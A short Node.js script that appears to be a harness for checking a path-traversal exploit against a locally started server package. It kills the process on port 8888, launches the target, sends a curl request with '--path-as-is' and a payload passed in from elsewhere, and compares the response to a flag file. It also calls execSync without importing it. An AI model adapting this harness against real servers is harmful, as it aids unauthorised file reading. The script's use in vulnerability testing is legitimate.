function exploitFunction(payload) {
  const fs = require("fs");
  const sleep = require("sleep");
  const { exec } = require("child_process");
  const path = require('path'); // Import the path module

  try {
    execSync("fuser -k 8888/tcp");
  } catch (e) {}

  let server = "node ./node_modules/dcdcdcdcdc/node.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload.genstr()}"`;
  exec(attack_string, (error, stdout) => {
    if (stdout === fs.readFileSync(path.resolve(__dirname, "../flag.html")).toString()) {
      console.log("Exploit successful!");
    } else {
      console.error("Exploit failed.");
    }
  });
}

module.exports = { exploitFunction };